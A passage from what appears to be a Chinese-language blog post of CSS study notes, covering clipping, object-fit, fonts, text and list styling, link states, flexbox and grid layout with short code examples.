加到元素上会把该元素和它的所有子元素从无障碍树上移除。这样做可以通过隐藏下列内容来提升使用辅助技术的用户体验：</p><ul><li>纯装饰性的内容，如图标、图片</li><li>重复的内容，如重复的文本</li><li>屏幕外或被折叠的内容，如菜单</li></ul></blockquote></li></ul></li><li><p>clip 属性定义了元素的哪一部分是可见的。（已弃用）</p><p>clip 属性只适用于 position:absolute 的元素。</p><figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs css"><span class="hljs-attribute">clip</span>: <span class="hljs-built_in">rect</span>(<span class="hljs-number">1px</span>, <span class="hljs-number">10em</span>, <span class="hljs-number">3rem</span>, <span class="hljs-number">2ch</span>)<br><span class="hljs-comment">/*rect(&lt;top&gt;, &lt;right&gt;, &lt;bottom&gt;, &lt;left&gt;) */</span><br>clip: auto<br>clip: inherit<br></code></pre></td></tr></table></figure></li><li><p>clip-path属性使用<strong>裁剪方式</strong>创建元素的可显示区域。</p><figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs css"><span class="hljs-comment">/* 圆形剪切 */</span><br><span class="hljs-attribute">clip-path</span>: <span class="hljs-built_in">circle</span>(<span class="hljs-number">40%</span>);<br><span class="hljs-comment">/* inset矩形：定义一个矩形，该矩形与引用框的每一边相距指定的插入距离。 */</span><br><span class="hljs-attribute">clip-path</span>: <span class="hljs-built_in">inset</span>(<span class="hljs-number">60px</span>);<br></code></pre></td></tr></table></figure></li><li><p>white-space CSS属性设置如何处理元素中的空白。</p><figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs css"><span class="hljs-attribute">white-space</span>: nowrap; <span class="hljs-comment">/* 与正常情况一样折叠白色空间，但在源代码中不显示换行符（文本换行）。 */</span><br></code></pre></td></tr></table></figure></li><li><p><strong><code>z-index</code></strong> 属性设置定位元素及其后代元素或 flex 项目的 Z 轴顺序。z-index 较大的重叠元素会覆盖较小的元素.</p></li><li><p><strong><code>vertical-align</code></strong> 用来指定行内元素（inline）或表格单元格（table-cell）元素的垂直对齐方式。</p></li><li></li></ul><h2 id="图像、媒体、表单"><a href="#图像、媒体、表单" class="headerlink" title="图像、媒体、表单"></a>图像、媒体、表单</h2><p>图像和视频被称为<strong>替换元素</strong>。</p><p><strong>可替换元素</strong>（<strong>replaced element</strong>）的展现效果不是由 CSS 来控制的。这些元素是一种外部对象，它们外观的渲染，是独立于 CSS 的。</p><h3 id="调整图像"><a href="#调整图像" class="headerlink" title="调整图像"></a>调整图像</h3><p>图像溢出盒子时，常用的方法是将图片的<code>max-width</code>设置为100%（这个方法也适用于其他替换元素，如<code>&lt;video&gt;</code>、<code>&lt;frame&gt;</code>）。</p><p>但这样调整，盒子和图片之间很可能存在间隙。这时候可以使用<code>object-fit</code>。（还可以防止图片扭曲）</p><p><strong><code>object-fit</code></strong> 属性指定可替换元素（例如：<code>&lt;img&gt; </code>或 <code>&lt;video&gt;</code>）的内容应该如何<strong>适应</strong>到其使用高度和宽度确定的框。</p><p>object-fit的值关键字：</p><ul><li>contain：缩放。填充内容框时保持其宽高比。若不匹配，对象将被添加“黑边”。</li><li>cover：保持宽高比的同事填充整个内容框。若不匹配，裁剪对象。</li><li>fill：拉伸填充。</li><li>none：保持原有尺寸。</li><li>scale-down：内容的尺寸与none或contain中一个相同，取尺寸更小的那个。</li></ul><p><strong><code>aspect-ratio</code></strong> 为盒子规定了<strong>首选纵横比</strong>，这个纵横比可以用于计算 auto 尺寸以及其他布局函数。</p><ul><li>&#96;&#96;&#96;css<br>aspect-ratio: 16 &#x2F; 9;<figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><code class="hljs css"><br><br><br><br><br>### <span class="hljs-selector-tag">form</span>表单<br><br>某些浏览器中，表单元素默认不会继承字体样式。<br><br>若需要确保继承字体样式，需要加入这条规则：` <span class="hljs-attribute">font-family</span>: inherit;`。<br><br>在 `&lt;<span class="hljs-selector-tag">textarea</span>&gt;` 上设置 `<span class="hljs-attribute">overflow</span>: auto` 以避免 IE 在不需要滚动条的时候显示滚动条。<br><br>**表单重置：**<br><br>```css<br>button,<br>input,<br>select,<br>textarea &#123;<br>  <span class="hljs-attribute">font-family</span>: inherit;<br>  <span class="hljs-attribute">font-size</span>: <span class="hljs-number">100%</span>;<br>  <span class="hljs-attribute">box-sizing</span>: border-box;<br>  <span class="hljs-attribute">padding</span>: <span class="hljs-number">0</span>;<br>  <span class="hljs-attribute">margin</span>: <span class="hljs-number">0</span>;<br>&#125;<br><br><span class="hljs-selector-tag">textarea</span> &#123;<br>  <span class="hljs-attribute">overflow</span>: auto;<br>&#125;<br></code></pre></td></tr></table></figure></li></ul><h2 id="文本"><a href="#文本" class="headerlink" title="文本"></a>文本</h2><h3 id="字体-font"><a href="#字体-font" class="headerlink" title="字体 font"></a>字体 font</h3><p>font的简写顺序：font-style, font-variant, font-weight, font-stretch, font-size, line-height,和 font-family。</p><ul><li><p><strong>font-style</strong>：开启&#x2F;关闭斜体italic。</p><ul><li><code>normal</code>：关闭</li><li><code>italic</code>：开启（当前字体斜体可用的情况下）</li><li><code>oblique</code>：普通文本倾斜样式</li></ul></li><li><p><strong>font-weight</strong>：文字粗体大小</p><ul><li><code>normal</code>，<code>bold：</code>普通、加粗</li><li><a href="https://developer.mozilla.org/zh-CN/docs/Web/CSS/font-weight">更多</a></li></ul></li><li><p><strong>text-transform</strong>：字体转换</p><ul><li><code>none</code>：防止任何转型</li><li><code>uppercase</code>: 将所有文本转为<u>大写</u>。</li><li><code>lowercase</code>: 将所有文本转为<u>小写</u>。</li><li><code>capitalize</code>: 转换所有单词让其<u>首字母大写</u>。</li><li><code>full-width</code>: 将所有字形转换成<u>全角</u>，即固定宽度的正方形</li></ul></li><li><p><strong>text-decoration</strong>：文本装饰（缩写属性，一次可接受多个值，由 <a href="https://developer.mozilla.org/zh-CN/docs/Web/CSS/text-decoration-line"><code>text-decoration-line</code></a>, <a href="https://developer.mozilla.org/zh-CN/docs/Web/CSS/text-decoration-style"><code>text-decoration-style</code></a> 和 <a href="https://developer.mozilla.org/zh-CN/docs/Web/CSS/text-decoration-color"><code>text-decoration-color</code></a> 构成）</p><ul><li><code>none</code>：取消</li><li><code>underline</code>: 文本下划线。</li><li><code>overline</code>: 文本上划线</li><li><code>line-through</code>: 穿过文本的线。</li></ul></li><li><p><strong>text-shadow</strong>：文字阴影（四个值：水平偏移、垂直偏移、模糊半径、基础颜色）</p><figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs css"><span class="hljs-attribute">text-shadow</span>: <span class="hljs-number">4px</span> <span class="hljs-number">4px</span> <span class="hljs-number">5px</span> red;<br></code></pre></td></tr></table></figure><ul><li>可设置多个阴影</li></ul></li><li><p><strong>font-family</strong>：允许你通过给定一个有先后顺序的，由字体名或者字体族名组成的列表来为选定的元素设置字体。</p></li></ul><figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs css"><span class="hljs-attribute">font-family</span>: <span class="hljs-string">&quot;Gill Sans&quot;</span>, sans-serif;<br></code></pre></td></tr></table></figure><p>网页安全字体（系统通用字体）：</p><table><thead><tr><th>字体名称</th><th>泛型</th><th>注意</th></tr></thead><tbody><tr><td><strong>Arial</strong></td><td><strong>sans-serif</strong></td><td>通常认为最佳做法还是添加 Helvetica 作为 Arial        的首选替代品，尽管它们的字体面几乎相同，但Helvetica 被认为具有更好的形状，即使 Arial 更广泛地可用。</td></tr><tr><td>Courier New</td><td>monospace</td><td>某些操作系统有一个 Courier New 字体的替代（可能较旧的）版本叫Courier。使用 Courier New 作为 Courier 的首选替代方案，被认为是最佳做法。</td></tr><tr><td>Georgia</td><td>serif</td><td></td></tr><tr><td><strong>Times New Roman</strong></td><td>serif</td><td>某些操作系统有一个 Times New Roman 字体的替代（可能较旧的）版本叫Times。使用 Times 作为 Times New Roman的首选替代方案，被认为是最佳做法。</td></tr><tr><td>Trebuchet MS</td><td>sans-serif</td><td>你应该小心使用这种字体——它在移动操作系统上并不广泛。</td></tr><tr><td>Verdana</td><td>sans-serif</td><td></td></tr></tbody></table><p><strong>默认字体</strong>：**<code>serif</code>, <code>sans-serif</code>, <code>monospace</code>**, <code>cursive</code>, 和 <code>fantasy</code>.</p><p><strong>字体栈</strong> (<strong>font stack</strong>)：当你无法保证想要使用的字体在网站上的可用性时，可以提供一个字体栈（包含多个字体）。这样浏览器可以有多种字体选择。(最好在字体栈最后提供一个合适的通用字体)。</p><figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs css"><span class="hljs-selector-tag">p</span> &#123;<br>  <span class="hljs-attribute">font-family</span>: <span class="hljs-string">&quot;Trebuchet MS&quot;</span>, Verdana, sans-serif;<br>&#125;<br></code></pre></td></tr></table></figure><p>字体的<strong>font-size</strong>属性从该元素的父元素继承（从根元素<code>&lt;html&gt;</code>开始，浏览器的标准值为16px）。</p><p><strong>@font-face</strong>：指定一个用于显示文本的自定义字体。字体能从远程服务器或者用户本地安装的字体加载。</p><figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs css"><span class="hljs-keyword">@font-face</span> &#123;<br>  <span class="hljs-attribute">font-family</span>: <span class="hljs-string">&quot;myFont&quot;</span>;<br>  <span class="hljs-attribute">src</span>: <span class="hljs-built_in">url</span>(<span class="hljs-string">&quot;myFont.ttf&quot;</span>);<br>&#125;<br></code></pre></td></tr></table></figure><h3 id="文本布局"><a href="#文本布局" class="headerlink" title="文本布局"></a>文本布局</h3><ul><li><strong>text-align</strong>：控制文本和内容盒子对其<ul><li><code>left</code>: 左对齐文本。</li><li><code>right</code>: 右对齐文本。</li><li><code>center</code>: 居中文字</li><li><code>justify</code>: 使文本展开，改变单词之间的差距，使所有文本行的宽度相同。</li></ul></li><li><strong>line-height</strong>：行高</li><li>letter-spacing：字母间距</li><li>word-spacing：单词间距</li></ul><h3 id="列表"><a href="#列表" class="headerlink" title="列表"></a>列表</h3><p><strong>list-style</strong>（可简写）：</p><ul><li><a href="https://developer.mozilla.org/zh-CN/docs/Web/CSS/list-style-type"><code>list-style-type</code></a>：设置用于列表的项目符号的类型<ul><li>disc:实心圆点（默认）</li><li>square：实心方块</li><li>circle：空心圆</li><li>decimal：十进制阿拉伯数字</li><li>lower-alpha，lower-latin：小写 ASCII letters</li></ul></li><li><a href="https://developer.mozilla.org/zh-CN/docs/Web/CSS/list-style-position"><code>list-style-position</code></a>：设置在每个项目开始之前，项目符号是出现在列表项内，还是出现在其外。<ul><li>outside：默认。The <a href="https://developer.mozilla.org/en-US/docs/Web/CSS/::marker"><code>::marker</code></a> is outside the principal block box（标记盒在主体盒外。）.</li><li>inside：The<code>::marker</code>is the first element among the list item’s contents.（标记盒位于元素内容之后）<ul><li><code>::marker</code>：匹配列表的标记框（通常为一个符号或数字）。它作用在任何设置了 display: list-item 的元素或伪元素上，例如<code> &lt;li&gt;</code> 和<code>&lt;summary&gt;</code>元素。</li></ul></li></ul></li><li><a href="https://developer.mozilla.org/zh-CN/docs/Web/CSS/list-style-image"><code>list-style-image</code></a>：允许为项目符号使用自定义图片</li></ul><p><strong>列表计数管理</strong>：</p><ul><li><p>start：允许从1以外的数字开始计数。</p></li><li><p>reversed：反向计数。</p></li><li><p>value：指定列表项数值。</p></li></ul><h3 id="链接"><a href="#链接" class="headerlink" title="链接"></a>链接</h3><p><strong>状态：</strong></p><ul><li><strong>Link (没有访问过的)</strong>: 默认状态。当它没有处在其他状态的时候，可以使用<a href="https://developer.mozilla.org/zh-CN/docs/Web/CSS/:link"><code>:link</code></a> 伪类来应用样式。</li><li><strong>Visited</strong>: 这个链接已经被访问过了 (存在于浏览器的历史纪录)。 可以使用 <a href="https://developer.mozilla.org/zh-CN/docs/Web/CSS/:visited"><code>:visited</code></a> 伪类来应用样式。</li><li><strong>Hover</strong>: 当用户的鼠标光标刚好停留在这个链接。可以使用 <a href="https://developer.mozilla.org/zh-CN/docs/Web/CSS/:hover"><code>:hover</code></a> 伪类来应用样式。</li><li><strong>Focus</strong>: 一个链接当它被选中的时候 (比如通过键盘的Tab移动到这个链接的时候，或者使用编程的方法来选中这个链接 <a href="https://developer.mozilla.org/en-US/docs/Web/API/HTMLElement/focus"><code>HTMLElement.focus()</code> (en-US)</a>) 它可以使用 <a href="https://developer.mozilla.org/zh-CN/docs/Web/CSS/:focus"><code>:focus</code></a> 伪类来应用样式。  </li><li><strong>Active</strong>: 一个链接当它被激活的时候 (比如被点击的时候)，它可以使用 <a href="https://developer.mozilla.org/zh-CN/docs/Web/CSS/:active"><code>:active</code></a> 伪类来应用样式。</li></ul><p>一些样式：</p><ul><li><a href="https://developer.mozilla.org/zh-CN/docs/Web/CSS/color"><code>color</code></a> 文字的颜色</li><li><a href="https://developer.mozilla.org/zh-CN/docs/Web/CSS/cursor"><code>cursor</code></a> 鼠标光标的样式。</li><li><a href="https://developer.mozilla.org/zh-CN/docs/Web/CSS/outline"><code>outline</code></a> 文字的轮廓 (轮廓有点像边框，唯一的区别是边框占用了盒模型的空间，而轮廓没有；它只是设置在背景图片的顶部)。</li></ul><h2 id="布局"><a href="#布局" class="headerlink" title="布局"></a>布局</h2><h3 id="正常布局流-normal-flow"><a href="#正常布局流-normal-flow" class="headerlink" title="正常布局流 normal flow"></a>正常布局流 normal flow</h3><p>不对页面进行任何布局控制时，浏览器默认的 HTML 布局方式。</p><p>一些布局技术会覆盖默认的布局行为：</p><p><strong><a href="https://developer.mozilla.org/zh-CN/docs/Web/CSS/display">display属性</a>、<a href="https://developer.mozilla.org/zh-CN/docs/Web/CSS/float">浮动float</a>、<a href="https://developer.mozilla.org/zh-CN/docs/Web/CSS/position">position</a>、表格布局、多列布局。</strong></p><p><strong>元素在默认情况下的布局：</strong></p><ul><li>首先，取得元素的内容放入一个独立的元素盒子中，周边加上padding、border和margin——也就是<strong>盒子模型</strong>。</li><li>默认情况下，<strong>块级元素</strong>会<u>填充其父元素的所有的行向空间</u>。块级元素的大小就是其本身。</li><li><strong>块级元素</strong>按照基于其父的书写模式的块流动方向放置。每个块级元素会在上个元素下面<u>另起一行</u>，以指定的外边距分隔。</li><li><strong>行级元素</strong><u>不会另起一行</u>。在其父级块级元素的宽度空间内，会和其他内联元素、相邻文本内容安排在同一行。若空间不够，则溢出。</li><li>如果两个垂直相邻的元素都设置了外边距并且两个外边距相接触，则进行<u>外边距折叠</u>。</li></ul><h3 id="弹性盒子-Flexible-Box"><a href="#弹性盒子-Flexible-Box" class="headerlink" title="弹性盒子 Flexible Box"></a>弹性盒子 Flexible Box</h3><p>弹性盒子是一种<u>用于<strong>按行或按列</strong>布局元素的<strong>一维</strong>布局</u>方法。</p><p>元素可以膨胀以填充额外的空间，收缩以适应更小的空间。</p><p>父元素定义**<code>display: flex</code><strong>（这样的父元素被称为</strong>flex容器<strong>），所有子元素（</strong>flex项**）都会按照flex进行布局。</p><h4 id="flex模型说明"><a href="#flex模型说明" class="headerlink" title="flex模型说明"></a>flex模型说明</h4><p><img src="https://soya-1300102518.cos.ap-shenzhen-fsi.myqcloud.com/2022/flex_terms.png" alt="flex模型：https://developer.mozilla.org/zh-CN/docs/Learn/CSS/CSS_layout/Flexbox/flex_terms.png"></p><p>flex模型沿着<strong>主轴（main axis）</strong>和<strong>交叉轴（cross axis）</strong>两个轴进行布局。</p><ul><li><strong>主轴</strong>（main axis）是沿着 flex 元素放置的方向延伸的轴（比如页面上的横向的行、纵向的列）。该轴的开始和结束被称为 <strong>main start</strong> 和 <strong>main end</strong>。</li><li><strong>交叉轴</strong>（cross axis）是垂直于 flex 元素放置方向的轴。该轴的开始和结束被称为 <strong>cross start</strong> 和 <strong>cross end</strong>。</li></ul><p> **<a href="https://developer.mozilla.org/zh-CN/docs/Web/CSS/flex-direction"><code>flex-direction</code></a>**指定主轴的方向（默认为row）。</p><p> <strong><code>flex-wrap</code></strong> 属性指定 flex 元素单行显示还是多行显示（wrap为换行）。</p><p>以上两个属性可以缩写为：<code>flex-flow:</code>。</p><h4 id="flex属性"><a href="#flex属性" class="headerlink" title="flex属性"></a>flex属性</h4><p>设置了弹性项目如何增大或缩小以适应其弹性容器中可用的空间。</p><p>flex是一个可以指定最多三个不通知的缩写属性：</p><ol><li>flex-grow：flex 容器中分配剩余空间的相对比例。</li><li>flex-shrink：指定了 flex 元素的收缩规则。</li><li>flex-basis：指定了 flex 元素在主轴方向上的初始大小。默认为auto。</li></ol><h4 id="水平和垂直对齐"><a href="#水平和垂直对齐" class="headerlink" title="水平和垂直对齐"></a>水平和垂直对齐</h4><p>案例：</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs html"><span class="hljs-tag">&lt;<span class="hljs-name">div</span>&gt;</span><br>  <span class="hljs-tag">&lt;<span class="hljs-name">button</span>&gt;</span>Smile<span class="hljs-tag">&lt;/<span class="hljs-name">button</span>&gt;</span><br>  <span class="hljs-tag">&lt;<span class="hljs-name">button</span>&gt;</span>Laugh<span class="hljs-tag">&lt;/<span class="hljs-name">button</span>&gt;</span><br>  <span class="hljs-tag">&lt;<span class="hljs-name">button</span>&gt;</span>Wink<span class="hljs-tag">&lt;/<span class="hljs-name">button</span>&gt;</span><br>  <span class="hljs-tag">&lt;<span class="hljs-name">button</span>&gt;</span>Shrug<span class="hljs-tag">&lt;/<span class="hljs-name">button</span>&gt;</span><br>  <span class="hljs-tag">&lt;<span class="hljs-name">button</span>&gt;</span>Blush<span class="hljs-tag">&lt;/<span class="hljs-name">button</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">div</span>&gt;</span><br></code></pre></td></tr></table></figure><p><img src="https://soya-1300102518.cos.ap-shenzhen-fsi.myqcloud.com/2022/%E6%88%AA%E5%B1%8F2023-10-19%20%E4%B8%8B%E5%8D%885.56.19.png" alt="截屏2023-10-19 下午5.56.19"></p><p>添加css：</p><figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs css"><span class="hljs-selector-tag">div</span> &#123;<br>  <span class="hljs-attribute">display</span>: flex;<br>  <span class="hljs-attribute">align-items</span>: center;<br>  <span class="hljs-attribute">justify-content</span>: space-around;<br>&#125;<br></code></pre></td></tr></table></figure><p><img src="https://soya-1300102518.cos.ap-shenzhen-fsi.myqcloud.com/2022/%E6%88%AA%E5%B1%8F2023-10-19%20%E4%B8%8B%E5%8D%885.56.59.png" alt="截屏2023-10-19 下午5.56.59"></p><p>现在所有的按钮整齐的垂直水平居中了。</p><p><strong><a href="https://developer.mozilla.org/zh-CN/docs/Web/CSS/align-items"><code>align-items</code></a></strong> 用于控制 flex 项在<strong>交叉轴上</strong>的位置。</p><ul><li>默认的值为<code>stretch</code>，所有 flex 项沿着交叉轴的方向拉伸以填充父容器。</li><li><code>center</code>：元素在侧轴居中。如果元素在侧轴上的高度高于其容器，那么在两个方向上溢出距离相同。</li><li><a href="https://developer.mozilla.org/zh-CN/docs/Web/CSS/align-self"><code>align-self</code></a> 属性可以覆盖<code>align-items</code>的行为。</li></ul><p><strong><a href="https://developer.mozilla.org/zh-CN/docs/Web/CSS/justify-content"><code>justify-content</code></a></strong> 控制 flex 项在<strong>主轴上</strong>的位置。</p><ul><li>默认值是 <code>flex-start</code>，使所有 flex 项都位于主轴的开始处。</li><li><code>flex-end</code> 使 flex 项到结尾处。</li><li><code>center</code> 在 <code>justify-content</code> 里也是可用的，可以让 flex 项在主轴居中。</li><li><code>space-around</code> 使所有 flex 项沿着主轴均匀地分布，在任意一端都会留有一点空间。</li><li><code>space-evenly</code>均匀排列每个元素，每个元素之间的间隔相等 </li><li><code>space-between</code>和 <code>space-around</code> 非常相似，只是它不会在两端留下任何空间。</li></ul><p><strong><code>gap</code></strong> 属性是用来设置网格行与列之间的<strong>间隙</strong>。该属性是row-gap和column-gap 的简写模式。</p><h4 id="flex项排序"><a href="#flex项排序" class="headerlink" title="flex项排序"></a>flex项排序</h4><p>使用<code>order</code>进行排序（不会影响到源顺序，也就是dom树里元素的顺序）。</p><p>例如添加以下css（还是上面的按钮案例）：</p><figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs css"><span class="hljs-selector-tag">button</span><span class="hljs-selector-pseudo">:first</span>-child &#123;<br>  <span class="hljs-attribute">order</span>: <span class="hljs-number">1</span>;<br>&#125;<br></code></pre></td></tr></table></figure><p><img src="https://soya-1300102518.cos.ap-shenzhen-fsi.myqcloud.com/2022/%E6%88%AA%E5%B1%8F2023-10-19%20%E4%B8%8B%E5%8D%886.09.19.png" alt="截屏2023-10-19 下午6.09.19"></p><p>现在smile移到了末尾。</p><ul><li>所有 flex 项<strong>默认的 <a href="https://developer.mozilla.org/zh-CN/docs/Web/CSS/order"><code>order</code></a> 值是 0。</strong></li><li>order值越大越排后</li></ul><h3 id="网格-Grid"><a href="#网格-Grid" class="headerlink" title="网格 Grid"></a>网格 Grid</h3><p>网格是一个用于 web 的二维布局系统（由一系列水平及垂直的线构成的一种布局模式）。被设计用于同时在<u>两个维度上把元素按行和列排列整齐</u>。</p><p>网格具有许多<strong>列（column）</strong>与<strong>行（row）</strong>，还有<strong>沟槽（gutter）</strong>(指行与行、列与列之间的间隙)。</p><p><strong>定义网格</strong>：**<code>display:grid</code>**。</p><p>使用 <a href="https://developer.mozilla.org/zh-CN/docs/Web/CSS/grid-template-rows"><code>grid-template-rows</code></a> 和 <a href="https://developer.mozilla.org/zh-CN/docs/Web/CSS/grid-template-columns"><code>grid-template-columns</code></a> 两个属性定义一些行和列的轨道。</p><p>利用 <a href="https://developer.mozilla.org/zh-CN/docs/Web/CSS/grid-column"><code>grid-column</code></a> 和 <a href="https://developer.mozilla.org/zh-CN/docs/Web/CSS/grid-row"><code>grid-row</code></a> 两个属性来指定每一个子元素应该从哪一行&#x2F;列开始，并在哪一行&#x2F;列结束。</p><p>使用<a href="https://developer.mozilla.org/zh-CN/docs/Web/CSS/grid-auto-rows"><code>grid-auto-rows</code></a>和<a href="https://developer.mozilla.org/zh-CN/docs/Web/CSS/grid-auto-columns"><code>grid-auto-columns</code></a>属性手动设定<strong>隐式网格</strong>。</p><p><code>grid-gap</code>用来定义间隙（列间隙：grid-column-gap，行间隙：grid-row-gap）。</p><p>可以使用<code>repeat</code>来重复构建具有某些宽度配置的某些列。</p><p>例如：<code>grid-template-columns: repeat(3, 1fr);</code></p><p><a href="https://developer.mozilla.org/zh-CN/docs/Web/CSS/minmax"><code>minmax()</code></a> 函数为一个行&#x2F;列的尺寸设置了取值范围（超出后会根据内容自动调整）。</p><h4 id="基于线的元素放置"><a href="#基于线的元素放置" class="headerlink" title="基于线的元素放置"></a>基于线的元素放置</h4><p>我们根据这些分隔线来放置元素，通过以下属性来指定从那条线开始到哪条线结束。</p><ul><li><a href="https://developer.mozilla.org/en-US/docs/Web/CSS/grid-column-start"><code>grid-column-start</code> (en-US)</a></li><li><a href="https://developer.mozilla.org/en-US/docs/Web/CSS/grid-column-end"><code>grid-column-end</code> (en-US)</a></li><li><a href="https://developer.mozilla.org/en-US/docs/Web/CSS/grid-row-start"><code>grid-row-start</code> (en-US)</a></li><li><a href="https://developer.mozilla.org/en-US/docs/Web/CSS/grid-row-end"><code>grid-row-end</code> (en-US)</a></li></ul><p>这些属性的值均为分隔线序号，你也可以用以下缩写形式来同时指定开始与结束的线。</p><ul><li><a href="https://developer.mozilla.org/zh-CN/docs/Web/CSS/grid-column"><code>grid-column</code></a></li><li><a href="https://developer.mozilla.org/zh-CN/docs/Web/CSS/grid-row"><code>grid-row</code></a></li></ul><p>注意开始与结束的线的序号要使用<code>/</code>符号分开。</p><figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><code class="hljs css"><span class="hljs-selector-class">.wrapper</span> &#123;<br>  <span class="hljs-attribute">display</span>: grid;<br>  <span class="hljs-attribute">grid-template-columns</span>: <span class="hljs-number">1</span>fr <span class="hljs-number">1</span>fr <span class="hljs-number">1</span>fr;<br>  <span class="hljs-attribute">grid-template-rows</span>: <span class="hljs-number">100px</span> <span class="hljs-number">100px</span>;<br>  <span class="hljs-attribute">grid-gap</span>: <span class="hljs-number">10px</span>;<br>&#125;<br><span class="hljs-selector-class">.box1</span> &#123;<br>  <span class="hljs-attribute">grid-column</span>: <span class="hljs-number">2</span> / <span class="hljs-number">4</span>;<br>  <span class="hljs-attribute">grid-row</span>: <span class="hljs-number">1</span>;<br>&#125;<br><span class="hljs-selector-class">.box2</span> &#123;<br>  <span class="hljs-attribute">grid-column</span>: <span class="hljs-number">1</span>;<br>  <span class="hljs-attribute">grid-row</span>: <span class="hljs-number">1</span> / <span class="hljs-number">3</span>;<br>&#125;<br><span class="hljs-selector-class">.box3</span> &#123;<br>  <span class="hljs-attribute">grid-row</span>: <span class="hljs-number">2</span>;<br>  <span class="hljs-attribute">grid-column</span>: <span class="hljs-number">3</span>;<br>&#125;<br><br>&lt;<span class="hljs-selector-tag">div</span> class=&quot;wrapper&quot;&gt;<br>  &lt;<span class="hljs-selector-tag">div</span> class=&quot;box1&quot;&gt;One&lt;/<span class="hljs-selector-tag">div</span>&gt;<br>  &lt;<span class="hljs-selector-tag">div</span> class=&quot;box2&quot;&gt;Two&lt;/<span class="hljs-selector-tag">div</span>&gt;<br>  &lt;<span class="hljs-selector-tag">div</span> class=&quot;box3&quot;&gt;Three&lt;/<span class="hljs-selector-tag">div</span>&gt;<br>&lt;/<span class="hljs-selector-tag">div</span>&gt;<br></code></pre></td></tr></table></figure><img src="https://soya-1300102518.cos.ap-shenzhen-fsi.myqcloud.com/2022/%E6%88%AA%E5%B1%8F2023-10-19%20%E4%B8%8B%E5%8D%883.35.15.png" alt="截屏2023-10-19 下午3.35.15" style="zoom:33%;" /><h4 id="使用grid-template-areas属性放置元素"><a href="#使用grid-template-areas属性放置元素" class="headerlink" title="使用grid-template-areas属性放置元素"></a>使用grid-template-areas属性放置元素</h4><p>用<a href="https://developer.mozilla.org/zh-CN/docs/Web/CSS/grid-template-areas"><code>grid-template-areas</code></a>属性，并且你要命名一些元素并在属性中使用这些名字作为一个区域。</p><p><code>grid-template-areas</code>属性的使用规则如下：</p><ul><li>你需要填满网格的每个格子</li><li>对于某个横跨多个格子的元素，重复写上那个元素<code>grid-area</code>属性定义的区域名字</li><li>所有名字只能出现在一个连续的区域，不能在不同的位置出现</li><li>一个连续的区域必须是一个矩形</li><li>使用<code>.</code>符号，让一个格子留空</li></ul><p>案例：</p><p>使用线的元素放置：</p><figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><code class="hljs css"><span class="hljs-selector-tag">header</span> &#123;<br>  <span class="hljs-attribute">grid-column</span>: <span class="hljs-number">1</span> / <span class="hljs-number">3</span>;<br>  <span class="hljs-attribute">grid-row</span>: <span class="hljs-number">1</span>;<br>&#125;<br><span class="hljs-selector-tag">article</span> &#123;<br>  <span class="hljs-attribute">grid-column</span>: <span class="hljs-number">2</span>;<br>  <span class="hljs-attribute">grid-row</span>: <span class="hljs-number">2</span>;<br>&#125;<br><span class="hljs-selector-tag">aside</span> &#123;<br>  <span class="hljs-attribute">grid-column</span>: <span class="hljs-number">1</span>;<br>  <span class="hljs-attribute">grid-row</span>: <span class="hljs-number">2</span>;<br>&#125;<br><span class="hljs-selector-tag">footer</span> &#123;<br>  <span class="hljs-attribute">grid-column</span>: <span class="hljs-number">1</span> / <span 